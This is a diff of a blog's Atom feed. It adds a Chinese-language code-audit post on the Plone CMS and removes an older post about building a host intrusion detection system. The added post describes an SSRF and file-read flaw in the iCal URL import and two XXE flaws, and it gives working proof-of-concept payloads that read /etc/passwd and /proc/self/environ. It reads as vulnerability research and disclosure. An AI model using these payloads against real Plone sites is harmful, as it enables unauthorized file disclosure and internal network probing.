@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2020-09-17T07:42:29.531Z</updated>
+  <updated>2020-11-18T01:35:28.516Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>代码审计--Plone</title>
+    <link href="/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Plone/"/>
+    <id>/2020/11/代码审计-Plone/</id>
+    <published>2020-11-18T01:32:02.000Z</published>
+    <updated>2020-11-18T01:35:28.516Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Plone"><a href="#Plone" class="headerlink" title="Plone"></a>Plone</h2><p>Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><code>plone.app.event-3.2.7-py3.6.egg\plone\app\event\ical\importer.py</code></p><pre><code>@button.buttonAndHandler(u&#39;Save and Import&#39;)    def handleSaveImport(self, action):        data, errors = self.extractData()        if errors:            return False        self.save_data(data)        ical_file = data[&#39;ical_file&#39;]        ical_url = data[&#39;ical_url&#39;]        event_type = data[&#39;event_type&#39;]        sync_strategy = data[&#39;sync_strategy&#39;]        if ical_file or ical_url:            if ical_file:                # File upload is not saved in settings                ical_resource = ical_file.data                ical_import_from = ical_file.filename            else:                ical_resource = urllib.request.urlopen(ical_url).read()                ical_import_from = ical_url            import_metadata = ical_import(                self.context,                ics_resource=ical_resource,                event_type=event_type,                sync_strategy=sync_strategy,            )</code></pre><p>如上所述，在读取参数<code>ical_url</code>时，根据程序设置是导入该事件的<code>icalendar</code>资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回</p><p>在Members功能下的<code>Action</code>中选择<code>Enable icalendar import</code>后，配置<code>Icalendar URL</code>参数。</p><p>参数：<code>http://127.0.0.1:22</code>，执行<code>Save and Import</code>。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109094919974.png" alt="image-20201109094919974"></p><p>urllib还支持文件协议，因此也可以用于文件读取</p><p>参数: <code>file:///proc/self/environ</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109100807462.png" alt="image-20201109100807462"></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\browser\records.py</code></p><pre><code>def import_registry(self):        try:            fi = self.request.form[&#39;file&#39;]            body = fi.read()        except (AttributeError, KeyError):            messages = IStatusMessage(self.request)            messages.add(u&quot;Must provide XML file&quot;, type=u&quot;error&quot;)            body = None        if body is not None:            importer = RegistryImporter(self.context, FakeEnv())            try:                importer.importDocument(body)            except XMLSyntaxError:                messages = IStatusMessage(self.request)                messages.add(u&quot;Must provide valid XML file&quot;, type=u&quot;error&quot;)        return self.request.response.redirect(self.context.absolute_url())</code></pre><p>注意<code>importDocument</code>方法，该方法在lxml.etree下调用该方法</p><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\exportimport\handler.py</code></p><pre><code>class RegistryImporter(object):    &quot;&quot;&quot;Helper classt to import a registry file    &quot;&quot;&quot;    LOGGER_ID = &#39;plone.app.registry&#39;    def __init__(self, context, environ):        self.context = context        self.environ = environ        self.logger = environ.getLogger(self.LOGGER_ID)    def importDocument(self, document):        tree = etree.fromstring(document)        if self.environ.shouldPurge():            self.context.records.clear()        i18n_domain = tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE))        if i18n_domain:            parseinfo.i18n_domain = i18n_domain        for node in tree:            if not isinstance(node.tag, str):                continue            condition = node.attrib.get(&#39;condition&#39;, None)            if condition and not evaluateCondition(condition):                continue            if node.tag.lower() == &#39;record&#39;:                self.importRecord(node)            elif node.tag.lower() == &#39;records&#39;:                self.importRecords(node)        parseinfo.i18n_domain = None</code></pre><p>此方法是此XXE的原因。 在网站设置<code>Site Setup</code>下的<code>Configuration Registry</code>中导出合适的XML文件。 在这里，选择了<code>plone.thumb_scale_table.xml</code>前缀文件。</p><p>参数 POC：</p><pre><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;&lt;registry&gt;  &lt;records interface=&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix=&quot;plone&quot;&gt;    &lt;value key=&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;/value&gt;  &lt;/records&gt;&lt;/registry&gt;</code></pre><p>执行后，您可以在错误报告中看到已解析的XML实体。<img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109142113406.png" alt="image-20201109142113406"></p><h3 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h3><p><code>plone.app.dexterity-2.6.5-py3.6.egg\plone\app\dexterity\browser\modeleditor.py</code></p><pre><code>class AjaxSaveHandler(BrowserView):    &quot;&quot;&quot;Handle AJAX save posts.    &quot;&quot;&quot;    def __call__(self):        &quot;&quot;&quot;Handle AJAX save post.        &quot;&quot;&quot;        if not authorized(self.context, self.request):            raise Unauthorized        source = self.request.form.get(&#39;source&#39;)        if source:            # Is it valid XML?            try:                root = etree.fromstring(source)            except etree.XMLSyntaxError as e:                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: &#39;XMLSyntaxError: {0}&#39;.format(                        safe_unicode(e.args[0])                    )                })            # a little more sanity checking, look at first two element levels            if root.tag != NAMESPACE + &#39;model&#39;:                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;)                })            for element in root.getchildren():                if element.tag != NAMESPACE + &#39;schema&#39;:                    return json.dumps({                        &#39;success&#39;: False,                        &#39;message&#39;: _(                            u&quot;Error: all model elements must be &#39;schema&#39;&quot;                        )                    })            # can supermodel parse it?            # This is mainly good for catching bad dotted names.            try:                plone.supermodel.loadString(source, policy=u&#39;dexterity&#39;)            except SupermodelParseError as e:                message = e.args[0].replace(&#39;\n  File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;)                return json.dumps({                    &#39;success&#39;: False,                    &#39;message&#39;: u&#39;SuperModelParseError: {0}&#39;.format(message)                })</code></pre><p>上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 <code>Dexterity Content Types</code>下选择<code>custom content types</code>，然后单击进入。 <code>fields</code>标签下的<code>Edit XML Field Model</code>可以直接编写xml代码。</p><p>参数 POC：</p><pre><code>&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;&lt;model xmlns:i18n=&quot;http://xml.zope.org/namespaces/i18n&quot; xmlns:marshal=&quot;http://namespaces.plone.org/supermodel/marshal&quot; xmlns:form=&quot;http://namespaces.plone.org/supermodel/form&quot; xmlns:security=&quot;http://namespaces.plone.org/supermodel/security&quot; xmlns:users=&quot;http://namespaces.plone.org/supermodel/users&quot; xmlns:lingua=&quot;http://namespaces.plone.org/supermodel/lingua&quot; xmlns=&quot;http://namespaces.plone.org/supermodel/schema&quot;&gt; &amp;title;&lt;schema/&gt;&lt;/model&gt;</code></pre><p>因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201110100900815.png" alt="image-20201110100900815"></p><p>问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：<a href="https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt" target="_blank" rel="noopener">https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;Plone&quot;&gt;&lt;a href=&quot;#Plone&quot; class=&quot;headerlink&quot; title=&quot;Plone&quot;&gt;&lt;/a&gt;Plone&lt;/h2&gt;&lt;p&gt;Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="python" scheme="/tags/python/"/>
+    
+  </entry>
   
   <entry>
     <title>开源WAF搭建</title>
@@ -452,31 +477,6 @@
       
       
         &lt;h3 id=&quot;Kafka-简介&quot;&gt;&lt;a href=&quot;#Kafka-简介&quot; class=&quot;headerlink&quot; title=&quot;Kafka 简介&quot;&gt;&lt;/a&gt;Kafka 简介&lt;/h3&gt;&lt;p&gt;详情：&lt;a href=&quot;http://kafka.apachecn.org/intro.ht
-      
-    
-    </summary>
-    
-    
-      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>中小型企业自研HIDS简单实现</title>
-    <link href="/2020/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E8%87%AA%E7%A0%94HIDS%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
-    <id>/2020/01/中小型企业自研HIDS简单实现/</id>
-    <published>2020-01-10T03:51:09.000Z</published>
-    <updated>2020-01-10T04:40:12.100Z</updated>
-    
-    <content type="html"><![CDATA[<p>此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：</p><ol><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">驭龙</a></li><li><a href="https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html" target="_blank" rel="noopener">美团</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MjE4MDc4OQ==&amp;mid=2247483961&amp;idx=1&amp;sn=2736aad509f08c20d82cfc08b62da27a&amp;chksm=ec040463db738d754cce84506c098caca891b58740e1b38b3621f752f805eb1c02ebf0e2ac73&amp;mpshare=1&amp;scene=1&amp;srcid=1226ZgmHAUTfeYMuLFPWyuHS#rd" target="_blank" rel="noopener">点融</a></li><li><a href="https://misakikata.github.io/2019/12/OSSEC-Wazuh/" target="_blank" rel="noopener">Wazuh</a></li></ol><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。</p><p><img src="https://i.loli.net/2020/01/10/WpozHBZAmJLiO4U.png" alt="1578622803994.png"></p><h3 id="Agent"><a href="#Agent" class="headerlink" title="Agent"></a>Agent</h3><p>agent的建设是整个流程中最费劲的事情了。需要以下几种特点</p><ol><li>可维护性高，获取信息稳定</li><li>对系统侵入小，适合多种系统的多版本内核</li><li>通道信息安全，进程可维护</li><li>支持灵活检测，负载小</li><li>便于一键化部署</li></ol><p>对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。</p><p>如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。</p><p>对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。</p><p>其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。</p><p>信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。</p><p>agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>server端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。</p><p>简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。</p><p>同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP：</p><p><a href="http://osint.bambenekconsulting.com" target="_blank" rel="noopener">http://osint.bambenekconsulting.com</a></p><p><a href="https://feodotracker.abuse.ch" target="_blank" rel="noopener">https://feodotracker.abuse.ch</a></p><p>通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。</p><h3 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h3><p>目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。</p><p>如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。</p><p>由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。</p><p>以下是代码实现，简单到会django就可以做二次修改哦</p><p><a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">zeru</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&quot;https://github.com/ysrc/yulong-hids&quot; target=&quot;_blank&quot; rel=&quot;noo
       
     
     </summary>
